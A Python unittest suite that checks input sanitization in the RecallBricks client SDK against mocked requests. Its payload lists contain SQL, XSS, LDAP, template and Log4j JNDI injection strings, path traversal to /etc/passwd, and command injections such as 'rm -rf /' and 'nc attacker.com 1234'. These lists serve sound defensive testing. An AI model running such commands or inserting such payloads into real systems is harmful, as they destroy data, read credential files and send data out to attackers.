"""
Security tests for Phase 2A metacognition features
Tests injection prevention, malformed responses, boundary values, and race conditions
"""

import unittest
from unittest.mock import patch, Mock
import sys
import os
import threading

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from recallbricks import RecallBricks
from recallbricks.exceptions import APIError, RecallBricksError, AuthenticationError


class TestPhase2ASecurity(unittest.TestCase):
    """Security tests for Phase 2A features"""

    def setUp(self):
        """Set up test fixtures"""
        self.api_key = "test_api_key_12345"
        self.client = RecallBricks(self.api_key)

    def test_sql_injection_prevention_context(self):
        """Test SQL injection attempts in context parameter"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            sql_injections = [
                "'; DROP TABLE memories; --",
                "' OR '1'='1",
                "1' UNION SELECT * FROM users--",
                "admin'--",
                "' OR 1=1--",
            ]

            for injection in sql_injections:
                # Should sanitize and not crash
                predictions = self.client.predict_memories(context=injection, limit=5)
                assert isinstance(predictions, list)

    def test_xss_injection_prevention(self):
        """Test XSS injection attempts"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'suggestions': []}

            xss_attempts = [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "<svg/onload=alert('xss')>",
                "<<SCRIPT>alert('xss');//<</SCRIPT>",
            ]

            for xss in xss_attempts:
                # Should sanitize and not crash
                suggestions = self.client.suggest_memories(xss, limit=5)
                assert isinstance(suggestions, list)

    def test_command_injection_prevention(self):
        """Test command injection attempts"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'results': []}

            command_injections = [
                "test; rm -rf /",
                "test && cat /etc/passwd",
                "test | nc attacker.com 1234",
                "$(curl evil.com)",
                "`whoami`",
                "${IFS}cat${IFS}/etc/passwd",
            ]

            for injection in command_injections:
                # Should sanitize and not crash
                results = self.client.search_weighted(injection, limit=5)
                assert isinstance(results, list)

    def test_path_traversal_prevention(self):
        """Test path traversal attempts in memory IDs"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            path_traversals = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
            ]

            for path in path_traversals:
                # Should sanitize the path
                predictions = self.client.predict_memories(
                    recent_memory_ids=[path],
                    limit=5
                )
                assert isinstance(predictions, list)

    def test_null_byte_injection(self):
        """Test null byte injection attempts"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'suggestions': []}

            null_byte_attempts = [
                "test\x00.exe",
                "test\x00",
                "\x00\x00\x00",
                "file.txt\x00.jpg",
            ]

            for attempt in null_byte_attempts:
                # Should remove null bytes
                suggestions = self.client.suggest_memories(attempt, limit=5)
                assert isinstance(suggestions, list)

                # Verify null bytes were removed
                call_args = mock_request.call_args
                context = call_args[1]['json']['context']
                assert '\x00' not in context

    def test_control_character_sanitization(self):
        """Test control character sanitization"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            control_chars = [
                "test\x01\x02\x03",
                "\x1b[31mRed Text\x1b[0m",
                "test\r\n",  # These should be preserved
                "test\t",    # These should be preserved
                "\x7fDEL",
            ]

            for chars in control_chars:
                predictions = self.client.predict_memories(context=chars, limit=5)
                assert isinstance(predictions, list)

    def test_ldap_injection_prevention(self):
        """Test LDAP injection attempts"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'results': []}

            ldap_injections = [
                "*)(uid=*))(|(uid=*",
                "admin)(|(password=*))",
                "*)(objectClass=*",
            ]

            for injection in ldap_injections:
                results = self.client.search_weighted(injection, limit=5)
                assert isinstance(results, list)

    def test_template_injection_prevention(self):
        """Test template injection attempts"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'suggestions': []}

            template_injections = [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{config.items()}}",
            ]

            for injection in template_injections:
                suggestions = self.client.suggest_memories(injection, limit=5)
                assert isinstance(suggestions, list)

    def test_log4j_style_injection(self):
        """Test Log4j-style JNDI injection attempts"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            log4j_attempts = [
                "${jndi:ldap://evil.com/a}",
                "${jndi:rmi://evil.com/a}",
                "${jndi:dns://evil.com/a}",
            ]

            for attempt in log4j_attempts:
                predictions = self.client.predict_memories(context=attempt, limit=5)
                assert isinstance(predictions, list)

    def test_unicode_normalization_attacks(self):
        """Test unicode normalization attacks"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'results': []}

            unicode_attacks = [
                "test\u202E",  # Right-to-left override
                "test\uFEFF",  # Zero-width no-break space
                "\u0000",      # Null character
            ]

            for attack in unicode_attacks:
                results = self.client.search_weighted(attack, limit=5)
                assert isinstance(results, list)

    def test_extremely_long_input(self):
        """Test extremely long input strings"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'suggestions': []}

            # 50,000 character string
            very_long = "A" * 50000

            # Should truncate to max_length (10000)
            suggestions = self.client.suggest_memories(very_long, limit=5)

            # Verify it was truncated
            call_args = mock_request.call_args
            context = call_args[1]['json']['context']
            assert len(context) <= 10000

    def test_malformed_json_response(self):
        """Test handling of malformed JSON responses"""
        with patch.object(self.client, 'session') as mock_session:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.content = b'{"invalid json'
            mock_response.json.side_effect = ValueError("Invalid JSON")

            mock_session.request.return_value = mock_response

            with self.assertRaises(RecallBricksError):
                self.client.predict_memories(limit=5)

    def test_response_with_unexpected_types(self):
        """Test responses with unexpected data types"""
        with patch.object(self.client, '_request') as mock_request:
            # Return string instead of list for predictions
            mock_request.return_value = {'predictions': 'not_a_list'}

            with self.assertRaises((TypeError, AttributeError)):
                self.client.predict_memories(limit=5)

    def test_negative_confidence_values(self):
        """Test handling of negative confidence values in response"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {
                'suggestions': [
                    {
                        'id': 'test',
                        'content': 'Test',
                        'confidence': -0.5,  # Invalid negative confidence
                        'reasoning': 'Test',
                        'relevance_context': 'Test'
                    }
                ]
            }

            # Should handle gracefully
            suggestions = self.client.suggest_memories("test", limit=5)
            assert len(suggestions) == 1
            # Dataclass accepts it but app logic should validate

    def test_boundary_values_limit(self):
        """Test boundary values for limit parameter"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            # Valid boundary values
            predictions = self.client.predict_memories(limit=1)  # Min
            assert isinstance(predictions, list)

            predictions = self.client.predict_memories(limit=100)  # Max
            assert isinstance(predictions, list)

            # Invalid boundary values
            with self.assertRaises(ValueError):
                self.client.predict_memories(limit=0)

            with self.assertRaises(ValueError):
                self.client.predict_memories(limit=101)

    def test_boundary_values_confidence(self):
        """Test boundary values for confidence parameter"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'suggestions': []}

            # Valid boundary values
            suggestions = self.client.suggest_memories("test", min_confidence=0.0)
            assert isinstance(suggestions, list)

            suggestions = self.client.suggest_memories("test", min_confidence=1.0)
            assert isinstance(suggestions, list)

            # Invalid boundary values
            with self.assertRaises(ValueError):
                self.client.suggest_memories("test", min_confidence=-0.001)

            with self.assertRaises(ValueError):
                self.client.suggest_memories("test", min_confidence=1.001)

    def test_boundary_values_days(self):
        """Test boundary values for days parameter"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {
                'avg_helpfulness': 0.5,
                'total_usage': 10,
                'active_memories': 5,
                'total_memories': 10,
                'trends': {}
            }

            # Valid boundary values
            metrics = self.client.get_learning_metrics(days=1)  # Min
            assert metrics is not None

            metrics = self.client.get_learning_metrics(days=365)  # Max
            assert metrics is not None

            # Invalid boundary values
            with self.assertRaises(ValueError):
                self.client.get_learning_metrics(days=0)

            with self.assertRaises(ValueError):
                self.client.get_learning_metrics(days=366)

    def test_race_condition_concurrent_writes(self):
        """Test race conditions with concurrent memory operations"""
        with patch.object(self.client, '_request') as mock_request:
            call_count = [0]
            call_lock = threading.Lock()

            def request_side_effect(*args, **kwargs):
                with call_lock:
                    call_count[0] += 1
                return {'predictions': []}

            mock_request.side_effect = request_side_effect

            results = []
            errors = []

            def concurrent_task():
                try:
                    pred = self.client.predict_memories(context="test", limit=5)
                    results.append(pred)
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=concurrent_task) for _ in range(100)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=10)

            # All should complete without errors
            assert len(errors) == 0
            assert len(results) == 100

    def test_type_confusion_attacks(self):
        """Test type confusion attacks"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            # Try passing wrong types
            with self.assertRaises(TypeError):
                self.client.predict_memories(context=123, limit=5)

            with self.assertRaises(TypeError):
                self.client.predict_memories(context=['list'], limit=5)

    def test_authentication_bypass_attempts(self):
        """Test that authentication cannot be bypassed"""
        # Empty API key
        with self.assertRaises(AuthenticationError):
            RecallBricks("")

        # None API key
        with self.assertRaises(AuthenticationError):
            RecallBricks(None)

    def test_request_smuggling_prevention(self):
        """Test prevention of HTTP request smuggling"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'results': []}

            # Try to inject headers or manipulate request
            smuggling_attempts = [
                "test\r\nX-Custom-Header: malicious",
                "test\nHost: evil.com",
                "test\r\n\r\nGET / HTTP/1.1",
            ]

            for attempt in smuggling_attempts:
                # Should sanitize newlines/carriage returns in non-text content
                results = self.client.search_weighted(attempt, limit=5)
                assert isinstance(results, list)

    def test_denial_of_service_prevention(self):
        """Test denial of service prevention"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            # Try to create resource exhaustion
            # 1. Very large list of recent IDs
            large_list = [f'mem_{i}' for i in range(10000)]

            # Should handle or limit
            try:
                predictions = self.client.predict_memories(
                    recent_memory_ids=large_list,
                    limit=5
                )
                # If it succeeds, it handled it
                assert isinstance(predictions, list)
            except (ValueError, RecallBricksError):
                # Or it can reject it
                pass

    def test_integer_overflow_prevention(self):
        """Test integer overflow prevention"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {'predictions': []}

            # Try extreme integer values
            with self.assertRaises(ValueError):
                self.client.predict_memories(limit=2**31)

            with self.assertRaises(ValueError):
                self.client.get_learning_metrics(days=2**31)

    def test_floating_point_edge_cases(self):
        """Test floating point edge cases"""
        import math

        # Test with special float values
        with self.assertRaises((ValueError, TypeError)):
            self.client.suggest_memories("test", min_confidence=float('inf'))

        with self.assertRaises((ValueError, TypeError)):
            self.client.suggest_memories("test", min_confidence=float('nan'))


class TestInputSanitization(unittest.TestCase):
    """Dedicated tests for input sanitization"""

    def setUp(self):
        """Set up test fixtures"""
        self.api_key = "test_api_key_12345"
        self.client = RecallBricks(self.api_key)

    def test_sanitize_removes_null_bytes(self):
        """Test that sanitize removes null bytes"""
        input_str = "test\x00value"
        sanitized = self.client._sanitize_input(input_str)
        assert '\x00' not in sanitized

    def test_sanitize_removes_control_chars(self):
        """Test that sanitize removes control characters"""
        input_str = "test\x01\x02\x03value"
        sanitized = self.client._sanitize_input(input_str)
        assert '\x01' not in sanitized
        assert '\x02' not in sanitized
        assert '\x03' not in sanitized

    def test_sanitize_preserves_tabs_newlines(self):
        """Test that sanitize preserves tabs and newlines"""
        input_str = "test\ttab\nNewline\rReturn"
        sanitized = self.client._sanitize_input(input_str)
        assert '\t' in sanitized
        assert '\n' in sanitized
        assert '\r' in sanitized

    def test_sanitize_enforces_max_length(self):
        """Test that sanitize enforces max length"""
        input_str = "A" * 20000
        sanitized = self.client._sanitize_input(input_str, max_length=5000)
        assert len(sanitized) == 5000

    def test_sanitize_rejects_non_string(self):
        """Test that sanitize rejects non-string input"""
        with self.assertRaises(TypeError):
            self.client._sanitize_input(123)

        with self.assertRaises(TypeError):
            self.client._sanitize_input(['list'])


def run_security_tests():
    """Run all security tests"""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    suite.addTests(loader.loadTestsFromTestCase(TestPhase2ASecurity))
    suite.addTests(loader.loadTestsFromTestCase(TestInputSanitization))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    print("\n" + "="*70)
    print("PHASE 2A SECURITY TEST SUMMARY")
    print("="*70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    success_rate = ((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100) if result.testsRun > 0 else 0
    print(f"Success rate: {success_rate:.1f}%")
    print("="*70)

    return result.wasSuccessful()


if __name__ == '__main__':
    success = run_security_tests()
    sys.exit(0 if success else 1)
